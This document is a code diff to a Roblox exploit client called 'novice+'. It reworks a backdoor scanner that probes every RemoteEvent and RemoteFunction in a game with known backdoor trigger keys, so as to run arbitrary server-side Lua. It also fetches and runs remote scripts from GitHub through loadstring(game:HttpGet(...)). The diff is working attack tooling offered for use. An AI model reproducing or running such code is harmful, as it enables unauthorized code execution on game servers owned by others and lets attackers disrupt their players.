@@ -1451,7 +1451,7 @@ TextLabel.Visible = true
 
 Clear_2.MouseButton1Click:Connect(function()
 	background:Play()
---	pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/BruhMoment-s/novice-/main/nexoPD")))
+	--	pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/BruhMoment-s/novice-/main/nexoPD")))
 	pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/BruhMoment-s/novice-/main/R15%20to%20R6")))
 
 end)
@@ -1460,9 +1460,18 @@ Clear.MouseButton1Click:Connect(function()
 	notify4:Play()
 
 end)
+function executeSS(code,remote,method)
+	if method == nil then
+		remote:FireServer(code)
+	else 
+		remote:FireServer(method,code)
+	end
+end
+
 function mainLibrary()
 	local lui = {}
-	lui.backdoorMode = nil
+	lui.mode = nil
+	lui.remote = nil
 	function lui.makeTabs(linkedFrame,image,imageRect,imageSize)
 		local mainButton = Instance.new("TextButton")
 		local buttonCorner = Instance.new("UICorner")
@@ -1513,8 +1522,9 @@ function mainLibrary()
 			if linkedFrame == "Exit" then 
 				shutdown:Play()
 				task.wait(1.8)
-				if lui.backdoorMode then
-					background.Parent.Parent:Destroy()
+				if lui.remote then
+					local callback = ("game.Players['%s']:SetAttribute('UsingNovice',false)"):format(game.Players.LocalPlayer.Name)
+					executeSS(callback,lui.remote,lui.mode)
 				end
 				game.CoreGui["novice+"]:Destroy() end
 
@@ -1672,11 +1682,13 @@ function mainLibrary()
 		end)
 		Execute.MouseButton1Click:Connect(function()
 			notify3:Play()
-			if lui.backdoorMode then
+			if lui.remote then
 				local callback = game:HttpGet(link):format(game.Players.LocalPlayer.Name)
-				local remote = lui.backdoorMode
-
-				remote:FireServer(callback)
+				local remote = lui.remote
+				local method = lui.mode
+			
+				
+				executeSS(callback,remote,method)
 			else 
 
 				pcall(
@@ -1820,15 +1832,18 @@ Classic.MouseButton1Click:Connect(function()
 	task.wait(0.5 - 0.1)
 	Executer.Visible = true
 end)
+
+
 Run_2.MouseButton1Click:Connect(function()
 	local callback = Source.Text
 	local callback = callback or function() end
 
-	if mainlib.backdoorMode then
-		local callback = callback:format(game.Players.LocalPlayer.Name)
-		local remote = mainlib.backdoorMode
+	if mainlib.remote then
+		local remote = mainlib.remote
+		local method = mainlib.mode
 
-		remote:FireServer(callback)
+
+		executeSS(callback,remote,method)
 	else 
 
 		pcall(loadstring(callback))
@@ -1837,49 +1852,12 @@ end)
 
 
 function attachRevamped()
---[[
-    backdoor.exe, the best backdoor scanner in Roblox.
-    Copyright (C) 2021	iK4oS
-
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation, either version 3 of the License, or
-    (at your option) any later version.
-
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
-
-    You should have received a copy of the GNU General Public License
-    along with this program.  If not, see <https://www.gnu.org/licenses/>.
-]]
-
-	local dateTimeNow = DateTime.now
-	local tableFind = table.find
-	local taskSpawn = task.spawn
-	local taskWait = task.wait
-	local stringRep = string.rep
-
-	local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
-	local ReplicatedStorage = game:GetService("ReplicatedStorage")
-	local JointsService = game:GetService("JointsService")
-	local StarterGui = game:GetService("StarterGui")
 
 	local LocalPlayer = game:GetService("Players").LocalPlayer
-	local requireScript = ("require(9982941173).k4scripts('%s', %s) -- "):format(LocalPlayer.Name, "true", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
-	local invCode = "4tRadfjY69"
-
-	local alternativeSS = {
-		run = { [1] = "5#lGIERKWEF" },
-		emma = { [1] = "pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2] = ",,,,,,,,,,,,,,," },
-		helpme = { [1] = "helpme" },
-		pickett = { [1] = "cGlja2V0dA==" },
-		harked = "https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/harkedSS.lua"
-	}
+	local requireScript = ("game.Players[\"%s\"]:SetAttribute(\"UsingNovice\",true) --%s "):format(LocalPlayer.Name, "true", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
 
 	local function notify(text)
-		StarterGui:SetCore(
+		game.StarterGui:SetCore(
 			"SendNotification",
 			{
 				Title = "novice.exe",
@@ -1889,41 +1867,49 @@ function attachRevamped()
 		)
 	end
 
+	local alternativeSS = {
+		run = { [1] = "5#lGIERKWEF" },
+		emma = { [1] = "pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2] = ",,,,,,,,,,,,,,," },
+		helpme = { [1] = "helpme" },
+		pickett = { [1] = "cGlja2V0dA==" },
+		harked = "https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/harkedSS.lua"
+	}
 	local function attached(possibleWait)
 		local PlayerGui =  LocalPlayer.PlayerGui
 
 		if possibleWait then
-			local start = dateTimeNow().UnixTimestampMillis
+			local start = DateTime.now().UnixTimestampMillis
 			local possibleWait = possibleWait * 1000
-			while PlayerGui and not PlayerGui:FindFirstChild("novice.exe") and (possibleWait > dateTimeNow().UnixTimestampMillis - start) do
-				taskWait()
+			while PlayerGui and not LocalPlayer:GetAttribute("UsingNovice") and (possibleWait > DateTime.now().UnixTimestampMillis - start) do
+				task.wait()
 			end
 		end
 
-		return PlayerGui and PlayerGui:FindFirstChild("novice.exe")
+		return LocalPlayer:GetAttribute("UsingNovice")
 	end
 
 	local function validRemote(rm)
 		local Parent = rm.Parent
 
 		if getgenv().blacklisted then
-			if tableFind(getgenv().blacklisted, rm:GetFullName()) then return false end
+			if table.find(getgenv().blacklisted, rm:GetFullName()) then return false end
 		end
 
 		if Parent then
-			if Parent == JointsService then return false end
+			if Parent == game:GetService("JointsService") then return false end
 
 			-- Addonis Check
-			if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
-				(rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
+			if (Parent == game:GetService("ReplicatedStorage") and rm:FindFirstChild("__FUNCTION")) or
+				(rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == game:GetService("ReplicatedStorage")) then return false end
 
 			-- 		if (Parent.ClassName == "Folder" and Parent.Name == "DefaultChatSystemChatEvents" and Parent.Parent == ReplicatedStorage) then return false end
 		end
 
-		if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end
+		--if rm:IsDescendantOf(game:GetService("ReplicatedStorage")) then return false end
 
 		return true
 	end
+
 
 	local function harked()
 		local backpack = LocalPlayer.Backpack 
@@ -1933,7 +1919,7 @@ function attachRevamped()
 	end
 	local function emmaBackdoor(rm)
 		local Parent = rm.Parent
-		return rm.Name == "emma" and Parent and Parent.Name == "mynameemma" and Parent.Parent == ReplicatedStorage
+		return rm.Name == "emma" and Parent and Parent.Name == "mynameemma" and Parent.Parent == game:GetService("ReplicatedStorage")
 	end
 
 	local function runBackdoor(rm)
@@ -1943,126 +1929,123 @@ function attachRevamped()
 			Parent:FindFirstChild("Version") and Parent:FindFirstChild("Title")
 	end
 
-	local function httpRequest(url)
-		if syn and syn.request then return syn.request({Url=url}).Body
-		elseif request then return request({Url=url}).Body
-		else return game:HttpGetAsync(url) end
-	end
-
 	local function scanGame()
 		notify("Scanning for a backdoor.")
 
 		if harked() then
-			loadstring(httpRequest(alternativeSS.harked))()
+			loadstring(game:HttpRequest(alternativeSS.harked))()
 			return
 		end
+		local DescendantsList = game:GetDescendants()
+		local currentType
+		for index=1, #DescendantsList do
+			local remote = DescendantsList[index]
+			if not validRemote(remote) then continue end
+			if remote.ClassName ~= "RemoteEvent" then continue end
 
-		do
-			local DescendantsList = game:GetDescendants()
-			for index=1, #DescendantsList do
-				if attached() then break end
-				local remote = DescendantsList[index]
-
-				if not validRemote(remote) then continue end
-				if remote.ClassName ~= "RemoteEvent" then continue end
-
-				if emmaBackdoor(remote) then
-					remote:FireServer(unpack(alternativeSS.emma), requireScript)
+			if emmaBackdoor(remote) then
+				remote:FireServer(unpack(alternativeSS.emma), requireScript)
+				currentType = unpack(alternativeSS.emma)
+				if attached() then 
+					print("Checking ", remote, " Method ",currentType)
+					print("Attached")
+					return remote,currentType
 				end
-				if not attached() and runBackdoor(remote) then
-					remote:FireServer(unpack(alternativeSS.run), requireScript)
-				end
-
-				if not attached() then remote:FireServer(unpack(alternativeSS.helpme), requireScript) end
-				if not attached() then remote:FireServer(unpack(alternativeSS.pickett), requireScript) end
-				if not attached() then remote:FireServer(requireScript) end
-
 			end
-			if attached() then return end
+			if not attached() and runBackdoor(remote) then
+				remote:FireServer(unpack(alternativeSS.run), requireScript)
+				currentType = unpack(alternativeSS.run)
+				if attached() then 
+					print("Checking ", remote, " Method ",currentType)
+					print("Attached")
+					return remote,currentType
+				end
+			end
+			if not attached() and remote.Name == "NoviceEvent" then
+				remote:FireServer(requireScript)
+				currentType = nil
+				if attached() then 
+					print("Checking ", remote, " Method ",currentType)
+					print("Attached")
+					return remote,currentType
+				end
+			end
 
+			if not attached() then
+				remote:FireServer(unpack(alternativeSS.helpme), requireScript)
+				currentType = unpack(alternativeSS.helpme)
+				if attached() then 
+					print("Checking ", remote, " Method ",currentType)
+					print("Attached")
+					return remote,currentType
+				end
+			end
+			if not attached() then 
+				remote:FireServer(unpack(alternativeSS.pickett), requireScript) 
+				currentType = unpack(alternativeSS.pickett)
+				if attached() then 
+					print("Checking ", remote, " Method ",currentType)
+					print("Attached")
+					return remote,currentType
+				end
+			end
+			if not attached() then 
+				remote:FireServer(requireScript)
+				currentType = nil
+			end
+			task.wait(0.001)
+			if attached() then 
+				print("Checking ", remote, " Method ",currentType)
+				print("Attached")
+				return remote,currentType
+			end
+
+		end
+		print("moving on")
+		if not attached() then 
 			for index=1, #DescendantsList do
-				if attached() then break end
 				local remote = DescendantsList[index]
 
 				if not validRemote(remote) then continue end
 				if remote.ClassName ~= "RemoteFunction" then continue end
 
 				local waiting = true
-				taskSpawn(function()
+				task.spawn(function()
 					remote:InvokeServer(requireScript)
 					waiting = nil
 				end)
 
 				-- If RemoteFunction don't respond in 1 second, we skip this one.
-				local start = dateTimeNow().UnixTimestampMillis
-				while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
-					taskWait()
+				local start = DateTime.now().UnixTimestampMillis
+				while waiting and 1000 > DateTime.now().UnixTimestampMillis - start do
+					task.wait()
 				end
-
+				if attached() then
+					print("hi you attached")
+					print("oh yeah remote function method")
+					return remote,nil
+				end
 			end
 		end
+
 	end
 
-	local function Main()
-		local function promtDicordInvite()
-			local httpService = game:GetService("HttpService")
-			local httpRequest = (syn and syn.request) or (httpService and httpService.request) or (http_request)
-
-			if not httpRequest then print("Exploit not supported. No HTTP found.") return end
-
-			httpRequest({
-				Url = "http://127.0.0.1:6463/rpc?v=1",
-				Method = "POST",
-
-				Headers = {
-					['Content-Type'] = 'application/json',
-					Origin = 'https://discord.com'
-				},
-
-				Body = httpService:JSONEncode({
-					cmd = 'INVITE_BROWSER',
-					nonce = httpService:GenerateGUID(false),
-					args = {code = invCode}
-				})
-			})
-		end
-		local Bindable = Instance.new("BindableFunction")
-		Bindable.OnInvoke = promtDicordInvite
-		
-
-		scanGame()
-
-		if not attached(3.5) then
-			notify("Unable to find backdoor.\nGame not backdoored?")
-		end
-	end
-
-	if game:IsLoaded() then
-		pcall(Main)
-	end
+	local remote,method =	scanGame()
+	if attached(3.5) then
+		notify("Novice+ attached")
+		return remote,method
+	else 
+		notify("Novice could not attach proprely.")
+	end	
 
 end
 Revamped.MouseButton1Click:Connect(function()
 	shutdown:Play()
 
-	attachRevamped()
-	if game.Players.LocalPlayer.PlayerGui:FindFirstChild("novice.exe") then else 
-		errorSound:Play()
-		local StarterGui = game:GetService("StarterGui")
-		StarterGui:SetCore(
-			"SendNotification",
-			{
-				Title = "Novice+ SS Revamped",
-				Duration = 3,
-				Text = "Could not attach proprely within 3.5 seconds, game might not have a backdoor?"
-			}
-		)
-		return
-	end
-	mainlib.backdoorMode = game.Players.LocalPlayer.PlayerGui:FindFirstChild("novice.exe")
-	if game.Players.LocalPlayer.PlayerGui:FindFirstChild("novice.exe") then
-		mainlib.backdoorMode = game.Players.LocalPlayer.PlayerGui:FindFirstChild("novice.exe")["Local Backdoor"].Remote
-	end
+	local remote,method = attachRevamped()
+	mainlib.remote = remote
+	mainlib.mode = method
+
 	TextLabel.Text = "Novice Revamped"
 	transition(false,Frame_2.Attacher,{Transparency = 1},0.5)
 	transition(false,Frame_2.Attacher.menuList,{ImageTransparency = 1},0.5)
